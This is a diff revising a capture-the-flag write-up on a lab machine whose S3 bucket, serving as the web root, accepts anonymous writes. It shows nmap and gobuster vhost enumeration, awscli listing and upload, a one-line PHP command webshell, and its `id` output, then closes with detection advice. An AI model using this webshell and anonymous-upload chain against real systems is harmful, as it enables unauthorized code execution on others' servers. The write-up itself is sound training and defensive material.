@@ -5,97 +5,118 @@
 ## Summary
 
 A static site that gives up nothing on the main host, because the application is
-not there. The real target is a virtual host whose name is short enough that
-most wordlists miss it, and that host turns out to be an S3 bucket with
-anonymous write access sitting in front of the web root. Uploading a PHP shell
-into the bucket is the whole foothold. The box is a good lesson in two things
-that look unrelated until they are not: DNS enumeration, and cloud storage
-permissions treated as a web server.
+not there. The target is a virtual host whose name is short enough that
+directory brute forcing never sees it, and that host turns out to be an S3
+bucket with anonymous write access sitting in front of the web root. Uploading a
+PHP shell into the bucket is the entire foothold, and the flag is readable by
+the web user. No privilege escalation, no CVE. Two things that look unrelated
+until they are not: hostname enumeration, and storage permissions treated as a
+web server.
 
 ## Enumeration
 
-Port scanning on this box told me less than DNS did. The useful work was
-virtual-host discovery against `thetoppers.htb`:
-
 ```
-gobuster vhost -u http://thetoppers.htb \
-  -w <subdomain-wordlist> --append-domain
+nmap -p- --min-rate 3000 -T4 -oN allports.txt 10.129.x.x
+nmap -sCV -p22,80 -oN services.txt 10.129.x.x
 ```
 
-The result was `s3.thetoppers.htb`, which is a hint in itself: the hostname is
-the service, so I stopped treating it as a website and treated it as storage.
+Two ports: SSH (OpenSSH 7.6p1) and HTTP (Apache 2.4.29, title "The Toppers").
+Nothing else was listening, so the box had to be solved through the web server.
 
-I did not record which wordlist I used, which is the one thing about this box I
-would fix in my notes. `s3` is a three-character name and standard subdomain
-lists are built from names people register, not the names people configure, so
-the hit was partly luck. A short manual list of infrastructure names — `s3`,
-`cdn`, `dev`, `staging`, `internal`, `assets` — is a faster second pass than
-doubling the wordlist size.
+The site itself is static, and I wasted the first pass on directories before
+accepting that. What worked was virtual-host enumeration:
+
+```
+gobuster vhost -u http://10.129.x.x --domain thetoppers.htb \
+  --append-domain -w subdomains-top5000.txt
+```
+
+That returned `s3.thetoppers.htb`. The hostname is the hint: the service name is
+the subdomain, so this is storage, not a website.
+
+`s3` is a three-character entry, and I had assumed wordlists skip names that
+short. `subdomains-top5000.txt` contains it, so I checked rather than guessed and
+saved myself a second pass with a larger list. With the hostnames in
+`/etc/hosts`, the endpoint answered on its own.
 
 ## Dead ends
 
-The main host was a static page with no links worth following, and I spent time
-on it before accepting that enumeration had to move to the hostname layer.
-Directory brute forcing a site that has no directories is a way to burn twenty
-minutes.
+Directory brute forcing. `gobuster dir` with `common.txt` and `php,txt,bak,zip`
+extensions returned nothing, because a static page has no directories to find.
+The application was one layer up, in the hostname.
 
-The other dead end was wordlist selection. A small list returns nothing here
-because the name is too short to appear, so the answer looked like "no vhosts"
-when the truth was "wrong list".
+The second false negative was my own upload. A `PUT` returned `200`, but
+requesting the file from the web root gave `404` for a few seconds. The object
+appears in the document root after a short sync. If I had stopped at the first
+`404` I would have concluded the bucket was read-only when it was wide open.
 
 ## Foothold
 
-`s3.thetoppers.htb` answered as an S3 endpoint, so I pointed `awscli` at it
-directly rather than trying to browse it:
+The S3 endpoint lists the bucket without credentials:
 
 ```
 aws --endpoint-url http://s3.thetoppers.htb s3 ls
+aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 ```
 
-The bucket was named `thetoppers.htb` and it accepted an unauthenticated PUT, so
-I uploaded a one-line shell to its root:
+The bucket is named `thetoppers.htb` and holds `.htaccess`, `index.php` and the
+site's images. It is also the document root, so anything written there is served
+by Apache.
+
+The same anonymous access allows a write:
 
 ```
 aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
 ```
 
-The bucket root is the document root, so Apache served it straight back:
+where `shell.php` is one line:
+
+```php
+<?php system($_GET["cmd"]); ?>
+```
+
+Then:
 
 ```
 curl "http://thetoppers.htb/shell.php?cmd=id"
 ```
 
-That returned `www-data`, which is the whole foothold. No exploit, no CVE. A
-storage bucket with the wrong policy was the vulnerability.
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+No credentials, no bucket policy, no exploit. The storage bucket accepted an
+unauthenticated `PUT` from anyone who knew the hostname, and the web server
+executed what landed in it.
 
 ## Privilege escalation
 
-None needed. The flag was readable as `www-data` at `/var/www/flag.txt`, and
-the shell could read it directly.
+None needed. The flag is at `/var/www/flag.txt`, owned `root:www-data` with group
+read, so `www-data` can read it directly through the same shell.
 
-That is worth saying plainly rather than dressing up: this box is not about
-escalation. The chain ends at the misconfiguration, and the interesting question
-is why the bucket allowed the write in the first place.
+That is the honest ending: this box is not about escalation. The chain stops at
+the misconfiguration, and the interesting question is why a bucket accepted
+writes from an unauthenticated client at all.
 
 ## What I would do differently
 
-- Record the exact wordlist and command for every box. "Some subdomain list"
-  makes a writeup unreproducible, including for me.
-- Test bucket write permissions on purpose as soon as an endpoint answers, with
-  a harmless `aws s3 cp /dev/null s3://bucket/test` rather than a shell.
-- Stop earlier on static hosts. If the page has no forms, no parameters and no
-  directories, the application is somewhere else.
+- Enumerate virtual hosts before directories. On a static site it is the only
+  enumeration that can produce a result.
+- Check bucket write permissions deliberately, with a harmless object, instead
+  of discovering them by uploading something I wanted to keep.
+- Give an upload a minute before calling it a failure. Cache and sync delays
+  look exactly like permission errors from the outside.
 
 ## Detections
 
-- An S3 bucket policy allowing unauthenticated `PutObject` is a reviewable
-  configuration error, and the kind of thing cloud security posture tools flag
-  as critical by default. It should never reach production.
+- A bucket with no policy at all, allowing anonymous `PutObject`, is a
+  reviewable configuration error. Cloud security posture tooling flags public
+  write as critical by default, and it should never reach production.
 - `PutObject` from an address the application never uses is a clean signal.
   CloudTrail data events are off by default, which is why this stays quiet.
 - A new `.php` file in a directory that should only hold static assets should
-  trip a file-integrity monitor. The webshell request itself
-  (`shell.php?cmd=`) is a trivial signature once logging exists.
+  trip a file-integrity monitor. The webshell request itself (`shell.php?cmd=`)
+  is a trivial signature once logging exists.
 
 ---
 
